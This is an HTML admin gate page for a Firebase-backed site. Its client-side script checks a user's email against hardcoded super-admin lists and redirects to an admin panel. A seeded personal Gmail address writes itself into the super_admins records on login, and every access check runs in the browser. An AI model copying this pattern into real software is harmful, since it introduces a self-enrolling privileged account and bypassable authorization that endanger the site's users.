<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="robots" content="noindex" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Admin</title>
    <link rel="icon" type="image/png" href="/NewLogo.png" />
  </head>
  <body>
    <div
      id="admin-guard"
      style="
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        gap: 12px;
        font-family: Arial, sans-serif;
        background: #faf8f3;
        color: #4a3f35;
      "
    >
      <img src="/NewLogo.png" alt="Logo" style="width: 72px; height: 72px" />
      <p style="margin: 0; font-size: 18px; font-weight: 700">
        Checking admin access...
      </p>
    </div>

    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
      import {
        getAuth,
        onAuthStateChanged,
      } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-auth.js";
      import {
        getDatabase,
        get,
        ref,
        set,
      } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

      const firebaseConfig = {
        apiKey: "AIzaSyASA3pOCHe5Y3nkw5XwsoPPN4cg6K15-vM",
        authDomain: "alpha-omega-trust.firebaseapp.com",
        databaseURL: "https://alpha-omega-trust-default-rtdb.firebaseio.com",
        projectId: "alpha-omega-trust",
        storageBucket: "alpha-omega-trust.firebasestorage.app",
        messagingSenderId: "1075031776025",
        appId: "1:1075031776025:web:d35cd8ecf136589ac08388",
      };

      const DEFAULT_SUPER_ADMINS = ["jcollins@globalgates.info"];
      const SEEDED_SUPER_ADMIN_EMAILS = ["xavierjames701@gmail.com"];
      const normalizeEmail = (email = "") => email.trim().toLowerCase();
      const getSuperAdminDocId = (email = "") =>
        normalizeEmail(email).replaceAll(".", ",");

      const app = initializeApp(firebaseConfig);
      const auth = getAuth(app);
      const database = getDatabase(app);

      const openFirebaseAdmin = () => {
        window.location.replace("/admin-panel");
      };

      const denyAccess = () => {
        window.location.replace("/login");
      };

      const seedManagedAdmins = async (actorEmail = "") => {
        try {
          await Promise.all(
            SEEDED_SUPER_ADMIN_EMAILS.map((email) => {
              const normalizedEmail = normalizeEmail(email);
              const adminRef = ref(
                database,
                `super_admins/${getSuperAdminDocId(normalizedEmail)}`,
              );
              const removedAdminRef = ref(
                database,
                `removed_admins/${getSuperAdminDocId(normalizedEmail)}`,
              );

              return get(removedAdminRef).then((removedAdminSnap) => {
                if (removedAdminSnap.exists()) {
                  return null;
                }

                return set(adminRef, {
                  email: normalizedEmail,
                  addedBy: normalizeEmail(actorEmail),
                  createdAt: Date.now(),
                });
              });
            }),
          );
        } catch (error) {
          // Non-blocking: default admin access should still work if seeding is blocked.
        }
      };

      onAuthStateChanged(auth, async (user) => {
        if (!user) {
          denyAccess();
          return;
        }

        const email = normalizeEmail(user.email);

        if (DEFAULT_SUPER_ADMINS.includes(email)) {
          await seedManagedAdmins(email);
          openFirebaseAdmin();
          return;
        }

        try {
          const removedAdminRef = ref(
            database,
            `removed_admins/${getSuperAdminDocId(email)}`,
          );
          const removedAdminSnap = await get(removedAdminRef);

          if (removedAdminSnap.exists()) {
            denyAccess();
            return;
          }

          const adminRef = ref(
            database,
            `super_admins/${getSuperAdminDocId(email)}`,
          );
          const adminSnap = await get(adminRef);

          if (adminSnap.exists()) {
            openFirebaseAdmin();
            return;
          }

          if (SEEDED_SUPER_ADMIN_EMAILS.includes(email)) {
            await set(ref(database, `super_admins/${getSuperAdminDocId(email)}`), {
              email,
              addedBy: DEFAULT_SUPER_ADMINS[0],
              createdAt: Date.now(),
            });
            openFirebaseAdmin();
            return;
          }

          denyAccess();
        } catch (error) {
          denyAccess();
        }
      });
    </script>
  </body>
</html>
